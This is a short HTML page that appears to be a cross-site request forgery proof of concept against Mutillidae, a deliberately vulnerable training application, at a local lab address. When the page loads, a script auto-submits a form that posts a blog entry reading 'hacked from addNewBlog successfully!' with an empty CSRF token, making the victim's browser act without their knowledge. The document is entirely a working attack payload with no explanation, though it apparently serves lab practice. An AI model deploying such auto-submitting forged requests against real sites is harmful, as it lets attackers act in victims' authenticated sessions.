<html>

<body>
    <form id="addToBlogFrom" method="post" action="http://192.168.1.41/mutillidae/index.php?page=add-to-your-blog.php">
        <input name="csrf-token" value="" />
        <textarea name="blog_entry">hacked from addNewBlog successfully!</textarea>
        <input name="add-to-your-blog-php-submit-button" value="Save Blog Entry" />
    </form>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('addToBlogFrom').submit();
        }, false);
    </script>
</body>

</html>